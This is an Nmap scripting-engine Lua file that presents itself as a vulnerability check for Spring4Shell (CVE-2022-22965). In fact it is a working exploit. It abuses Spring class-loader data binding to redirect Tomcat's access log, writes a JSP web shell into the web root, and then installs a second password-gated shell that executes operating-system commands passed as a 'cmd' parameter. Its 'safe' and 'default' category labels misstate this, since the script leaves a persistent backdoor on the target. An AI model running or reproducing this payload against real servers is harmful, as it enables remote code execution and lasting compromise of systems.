description = [[
  Spring4Shell
  
  CVE-2022-22965
]]

---
-- @usage
-- 
-- @output
--
-- @args
--
---

local http = require "http"
local string = require "string"
local table = require "table"
local stdnse = require "stdnse"
local shortport = require "shortport"
local vulns = require "vulns"

author = "Grzegorz Piechnik <bugspace DOT com>"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"default", "vuln", "safe", "spring4shell"}

-- We are only interested in http requests
portrule = shortport.http

action = function(host, port)

  -- The buln definition section
  local vuln = {
      title = "Spring4Shell - Spring Framework RCE via Data Binding on JDK 9+",
      state = vulns.STATE.NOT_VULN, --default
      IDS = { CVE = 'CVE-2022-22965' }
  } 

  local report = vulns.Report:new(SCRIPT_NAME, host, port)

  -- Local variables
  local endpoint = stdnse.get_script_args(SCRIPT_NAME .. '.endpoint') or ''
  local command =  stdnse.get_script_args(SCRIPT_NAME .. '.command') or 'id'
  local assertion =  stdnse.get_script_args(SCRIPT_NAME .. '.assertion') or 'uid'
  local filename =  stdnse.get_script_args(SCRIPT_NAME .. '.filename') or 'shell'

  if command ~= 'id' and assertion == 'uid' then
    return("ERROR: To use a 'command' argument, also define an 'assertion' argument.")
  end

  if command == 'id' and assertion ~= 'uid' then
    return("ERROR: To use a 'assertion' argument, also define an 'command' argument.")
  end

  local post_headers = {
    ["content-type"] = "application/x-www-form-urlencoded"
  }

  local get_headers = {
      ["prefix"] = "<%",
      ["suffix"] = "%>//",
      ["c"] = "Runtime",
      ["c1"] = "Runtime",
      ["c2"] = "Runtime",
      ["dnt"] = "1",
      ["content-type"] = "application/x-www-form-urlencoded"
  }

  local log_pattern = "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bprefix%7Di%20java.io.InputStream%20in%20%3D%20%25%7Bc%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%25%7Bsuffix%7Di"
  local log_file_suffix = "class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp"
  local log_file_dir = "class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT"
  local log_file_prefix = "class.module.classLoader.resources.context.parent.pipeline.first.prefix=" .. filename
  local log_file_date_format  = "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="
  local file_date_data = "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=_"
  local payload = log_pattern .. log_file_suffix .. log_file_dir .. log_file_prefix .. log_file_date_format
  local second_payload = "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=" .. filename .. "&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="

  if shortport.http(host, port) then
    -- First POST request
    stdnse.debug("First post request")
    local response = http.generic_request(host, port.number, "POST", endpoint, { header = post_headers, content = file_date_data, no_cache = true })

    -- Change the tomcat log location variables --
    stdnse.debug("Change the tomcat log location variables")
    local response = http.generic_request(host, port.number, "POST", endpoint, { header = post_headers, content = payload, no_cache = true })
    stdnse.sleep(3)

    -- Write the web shell --
    stdnse.debug("Write the web shell")
    local response = http.generic_request(host, port.number, "GET", endpoint, { header = get_headers, no_cache = true })
    stdnse.sleep(1)

    -- Reset the pattern
    stdnse.debug("Reset the pattern")
    local pattern_data = "class.module.classLoader.resources.context.parent.pipeline.first.pattern="
    local response = http.generic_request(host, port.number, "POST", endpoint, { header = post_headers, content = pattern_data, no_cache = true })

    -- Send second payload
    stdnse.debug("Send second payload")
    local response = http.generic_request(host, port.number, "POST", endpoint, { header = post_headers, content = second_payload, no_cache = true })

    -- Verify that RCE is working on the server
    stdnse.debug("Verify that RCE is working on the server")
    local response = http.generic_request(host, port.number, "GET", endpoint, { header = get_headers, content = pattern_data, no_cache = true })
    local response_body = response.body
    local status = response.status

    if status == nil then
      -- Something went really wrong out there
      -- According to the NSE way we will die silently rather than spam user with error messages
      vuln.extra_info = "URL: " .. host.ip .. ":" .. port.number .. endpoint
    else
      if status ~= 404 then
        if string.find(response_body, assertion) or string.find(response_body, "quest.getParameter") then
          vuln.state = vulns.STATE.VULN
        else
          vuln.state = vulns.STATE.LIKELY_VULN
        end
        vuln.check_results = host.ip .. ":" .. port.number .. "/" .. filename .. ".jsp?cmd=" .. command
        vuln.extra_info = "TESTED URL: " .. host.ip .. ":" .. port.number .. endpoint .. "\n" .. "    COMMAND: " .. command .. "\n" .. "    ASSERTION: " .. assertion
      else
        vuln.extra_info = "TESTED URL: " .. host.ip .. ":" .. port.number .. endpoint .. "\n" .. "    COMMAND: " .. command .. "\n" .. "    ASSERTION: " .. assertion
      end
    end

    return report:make_output(vuln)
    end
end


